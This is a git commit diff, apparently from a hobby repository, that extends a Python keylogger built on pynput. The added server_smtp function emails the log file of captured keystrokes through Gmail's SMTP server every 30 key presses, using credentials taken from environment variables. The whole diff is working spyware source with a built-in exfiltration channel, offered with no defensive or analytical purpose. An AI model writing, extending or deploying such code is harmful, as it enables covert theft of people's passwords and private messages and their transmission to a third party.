0d24dc53e13c75ad4e2d93d8acd7287cf3420948
jeff <68586091+jeffreynaces45@users.noreply.github.com>
2021-01-09 20:35:58 +0100

    update keylogger
    update keylogger with module smtp

--- keylogger.py
+++ keylogger.py
@@ -1,14 +1,41 @@
+import os
+import smtplib
+from email.message import EmailMessage
 import pynput
-
 from pynput.keyboard import Key, Listener
 
-count = 0
-keys = []
 
+"""
+function used to send an email with your log.txt file attacchements.
+"""
+def server_smtp():
+#credential server smtp must be imported in your environment path
+    EMAIL_ADDRESS = os.environ.get('DB_USER')
+    EMAIL_PASSWORD = os.environ.get('DB_PASSWORD')
+
+
+    msg = EmailMessage()
+    msg['Subject'] = 'text email keylogger'
+    msg['From'] = EMAIL_ADDRESS
+    msg['To'] = 'email to send'
+    msg.set_content('file attacched...')
+
+    with open('log.txt', 'r') as f:
+        file_data = f.read()
+        file_name = f.name
+
+    msg.add_attachment(file_data, filename=file_name)
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        smtp.send_message(msg)
 
 """
 function used to store anything you write on your keyboard and after 10 types they are stored in a file
 """
+count = 0
+keys = []
+
 def on_press(key):
     global keys, count
     
@@ -16,10 +43,12 @@ def on_press(key):
     count += 1
     print("{0} pressed".format(key))
 
-    if count >= 10:
+    if count >= 30:
         count = 0
         write_on_file(keys)
         keys = []
+        server_smtp()
+
 
 """
 function used to stop your program
@@ -42,8 +71,10 @@ def write_on_file(keys):
                 f.write('\n')
             elif k.find("Key") == -1 :
                 f.write(k)
+"""
+we use listener to listen a key events
+"""
 
-# we use listener to listen a key events
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
     
